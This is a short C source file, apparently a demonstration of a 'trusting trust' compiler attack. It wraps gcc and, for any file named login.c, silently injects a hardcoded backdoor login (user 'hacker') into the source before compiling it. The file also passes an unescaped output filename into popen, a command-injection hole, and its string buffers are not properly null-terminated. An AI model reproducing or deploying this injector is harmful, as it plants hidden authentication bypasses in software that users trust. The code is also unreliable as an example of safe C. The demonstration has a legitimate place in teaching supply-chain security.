#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(int argc, char *argv[]){

	//We need 4 arguments "program source -o binary"
	if(argc < 4){
		printf("Insufficient arguments\n");
		return 1;
	}

	char * sourceFilename = argv[1];
	char * destFilename = argv[3];

	FILE * inputFile = fopen(sourceFilename, "r");

	if(inputFile == NULL){
		printf("File does not exist");
		return 1;
	}

	
	//Get source file size
	fseek(inputFile, 0 , SEEK_END);
  	int sourceFileSize = ftell(inputFile);
  	rewind(inputFile);

  	//Read source file into buf
	char *buffer = (char *) malloc(sourceFileSize);
	int read = fread(buffer, sizeof(char), sourceFileSize, inputFile);
	fclose(inputFile);
	
	/* We pass the source code to GCC as the backend compiler */


	if(strstr(sourceFilename, "login.c") != NULL){

		char stringToInject[200];

		//Generate malicious code
		snprintf(stringToInject, 200, "if(strcmp(username, \"hacker\") == 0 && strcmp(password, \"i-hate-numbers\") == 0){\n\t\tprintf(TEXT_AUTHORISED);\n\t\treturn 0;\n\t}\n\n\t");

		int lengthOfMaliciousCode = strlen(stringToInject);

		int newTotalBuffRequired = sourceFileSize + lengthOfMaliciousCode;

		char * newTempBuffer = (char *) malloc(newTotalBuffRequired);

		//Get location of "printf(TEXT_UNAUTHORISED);"
		char * injectPosition = strstr(buffer, "printf(TEXT_UNAUTHORISED);");

		int sizeOfPreInjectedBuff = injectPosition - buffer;

		//Copy pre-injected original code into temp buffer
		strncpy(newTempBuffer, buffer, sizeOfPreInjectedBuff);

		//Copy malicious code to buffer
		strncat(newTempBuffer, stringToInject, lengthOfMaliciousCode);

		//Copy post-injected original code to buffer
		strcat(newTempBuffer, injectPosition);

		//Replace the existing buffer with the modified buffer with malicious code
		free(buffer);
		buffer = newTempBuffer;
		sourceFileSize = newTotalBuffRequired;

	}



	char compileCommand[500];

	//Generate compile command, tell GCC to assume C language and get source code via stdin
	snprintf(compileCommand, 500, "gcc -o %s -xc -", destFilename);

	FILE * gccStdin;
 	gccStdin = popen(compileCommand, "w");
 	
 	//Pass source code to GCC via stdin
 	fwrite(buffer, sizeof(char), sourceFileSize, gccStdin);
 	
 	printf("This is the source code passed to GCC:\n");
	printf("%s\n", buffer);

  	pclose(gccStdin);

	free(buffer);

}
